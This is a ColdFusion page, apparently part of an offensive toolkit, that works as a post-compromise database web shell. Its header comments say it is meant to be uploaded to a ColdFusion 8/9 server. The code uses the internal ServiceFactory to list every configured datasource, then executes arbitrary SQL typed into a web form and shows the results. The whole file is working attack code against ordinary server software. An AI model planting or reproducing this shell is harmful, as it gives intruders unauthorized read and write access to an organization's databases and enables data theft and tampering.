<!-- foldFusion page by lawKnee							-->
<!-- useful when you can upload cfm and would like to talk to all db's avail	-->
<!-- but dont want to (or can't) connect from the OS				-->
<!-- this page uses ServiceFactory to auto-enum all datasources on the instance	-->
<!-- only works on CF8 and below, but unpatched CF9 should work too		-->

<html>
<body>
<p><b>Notes:</b></p>
<ul>
<li>Select the database you want to use</li>
<li>Write SQL statements in the text box</li>
</ul>

<form method="POST" action="">
<p><b>SQL Interface:</b></p>
Datasource<br>
<select name="datasource">
<cfscript>
dataSourceObb=createobject("java","coldfusion.server.ServiceFactory").
	getDatasourceService().getDatasources();
	for(i in dataSourceObb) {
	writeoutput('<option value="' & i & '">' & i & '</option>');
	}
</cfscript>
</select>

<br>
SQL<br>
<textarea name="sql" rows="5" cols="100"></textarea>
<br>
<input type=submit value="Exec">
</form>

<cfif isdefined("form.sql")>
<cfquery name="runsql" datasource="#Form.datasource#" timeout="30">
	#Form.sql#
</cfquery>
</cfif>

<table border=1>
    <cfif isdefined("form.sql")>
    <cfloop from="0" to="#runsql.RecordCount#" index="row">
        <cfif row eq 0>
                <tr>
                        <cfloop list="#runsql.ColumnList#" index="column" delimiters=",">
                                <th><cfoutput>#column#</cfoutput></th>  
                        </cfloop>
                </tr>
        <cfelse>
                <tr>
                        <cfloop list="#runsql.ColumnList#" index="column" delimiters=",">
                                <td><cfoutput>#runsql[column][row]#</cfoutput></td>
                        </cfloop>
                </tr>
        </cfif>
    </cfloop>
    </cfif>
</table>



</body>
</html>